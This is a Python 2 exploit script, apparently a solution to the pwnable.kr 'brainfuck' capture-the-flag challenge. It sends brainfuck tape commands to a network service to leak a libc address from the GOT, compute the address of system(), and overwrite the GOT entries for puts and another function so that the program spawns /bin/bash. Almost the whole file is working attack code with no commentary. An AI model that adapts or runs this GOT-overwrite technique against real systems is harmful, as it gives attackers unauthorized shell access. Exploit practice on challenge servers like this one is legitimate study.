from time import sleep
import struct
import socket
IP = '127.0.0.1'
#IP = 'pwnable.kr'
PORT = 9001
__libc_start_main_got = 0x804A024
system_offset = 0x25e90
p = 0x0804A0A0
p_bash = p
param_pool = 0x0804A004
puts_got = 0x804A018
magic_got = 0x08048430

def get_offset(a, b):
    if b > a:
        return '+' * (b-a)
    else:
        return '-' * (a-b)

def move(t):
    global p
    p0 = p
    p = t
    if t == p0:
        return ''
    if t > p0:
        return '>' * (t-p0)
    else:
        return '<' * (p0-t)

def walk(w):
    global p
    p1 = p + w
    return move(p1)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, PORT))
raw_input('pause')
sleep(1)
sock.recv(1024)
a = ''

# Write /bin/bash bytes on p[]
# Fill in p[]
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','

# Read __libc_start_main_got, prepare for system addr
a += move(__libc_start_main_got)
a += '.'
a += walk(1)
a += '.'
a += walk(1)
a += '.'
a += walk(1)
a += '.'

# char *a = "/bin/bash", string pointer
a += move(param_pool)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','

# modify magic got to system 
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','

# modify puts got to magic got
a += move(puts_got)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += '['

print 'Send:', a
sock.send(a + '\n')

print 'Send:', map(hex,map(ord,'/bin/bash\x00'))
a = '/bin/bash'
sock.send(a + '\00')

sleep(1)
buf = sock.recv(1024)
print 'Recv:', buf
__libc_start_main = int(struct.unpack('<I', buf)[0])
system = __libc_start_main + system_offset

# Fill in /bin/bash & magic & puts@got
print 'Send:', hex(p_bash), hex(system), hex(magic_got)
a = struct.pack('<I', p_bash) + struct.pack('<I', system) + struct.pack('<I',magic_got)
sock.send(a + '\n')

sleep(1)
buf = sock.recv(1024)
print 'Recv:', buf
